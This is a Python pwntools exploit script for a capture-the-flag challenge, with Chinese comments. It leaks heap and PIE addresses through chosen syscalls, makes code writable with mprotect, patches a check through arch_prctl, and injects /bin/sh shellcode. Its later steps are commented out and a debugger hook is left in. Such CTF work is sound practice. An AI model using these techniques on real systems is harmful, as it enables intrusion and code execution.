#encoding: utf-8
# https://ctftime.org/writeup/18792

###########################################
#  	sys_brk(0x10000)   leak heap          #
#   sys_writev     leak pie               #
#	sys_mprotect($base, 0x1000, PROT_RWX) #
#	sys_arch_prctl(ARCH_SET_GS, 0xC3C031) #
#	sys_arch_prctl(ARCH_GET_GS, $check)   #
#	sys_read(0, $syscall + 0x46, 0x40)    #
###########################################


from pwn import *
import binascii

context.arch = 'amd64'

def syscall(rax, rdi, rsi, rdx):
	r.sendlineafter('syscall:', str(rax))
	r.sendlineafter('arg1:', str(rdi))
	r.sendlineafter('arg2:', str(rsi))
	r.sendlineafter('arg3:', str(rdx))


r = process('./chall')

sys_mprotect = 10
sys_brk = 12
sys_writev = 20
sys_arch_prctl = 158

#brk(0x10000) leak heap_base
syscall(sys_brk, 0x10000, 0, 0)

r.recvuntil(':')
addr = int(r.recvline().strip(), 16)
# class 的 vtable
vtable = addr - 0xf190
print "vtable @ ", hex(vtable)

# writev(STDOUT_FILENO, $heap, 1) leak class 的 *vtable, 並計算出 pie_base
gdb.attach(r, 'b *$_pie() + 0x127a')
syscall(sys_writev, 1, vtable, 1)
'''
r.recvline()
pie_base = u64(r.recvline()[:6]+'\x00'*2) - 0x10ca
print "pie_base @ ", hex(pie_base)


# mprotect 讓我們能直接改程式碼
syscall(sys_mprotect, pie_base, 0x2000, 7)



ARCH_SET_GS = 0x1001
ARCH_GET_GS = 0x1004
# sys_arch_prctl(struct task_struct *task, int code, unsigned long *addr)
# 利用 set_gs 和 get_gs 任意寫入
# 將 check() patch 掉
# 可用 objdump -d ./chall -Mintel 觀察
# 最多只能寫 6 bytes(超過會變 0), 但會填入 8 bytes => (*(pie_base+0x119a)=0x000000b80a75c0)
syscall(sys_arch_prctl, ARCH_SET_GS, 0xb80a75c0, 0)
syscall(sys_arch_prctl, ARCH_GET_GS, pie_base+0x119a, 0)

# 寫入 shell code
sc = shellcraft.amd64.sh()
# 在 check return 後寫入 shell code, 所以要再呼叫一次 syscall
syscall(0, 0, pie_base + 0x14a4, 0x40);
r.sendlineafter('=========================', asm(sc))
syscall(0, 0, 0, 0)
'''
r.interactive()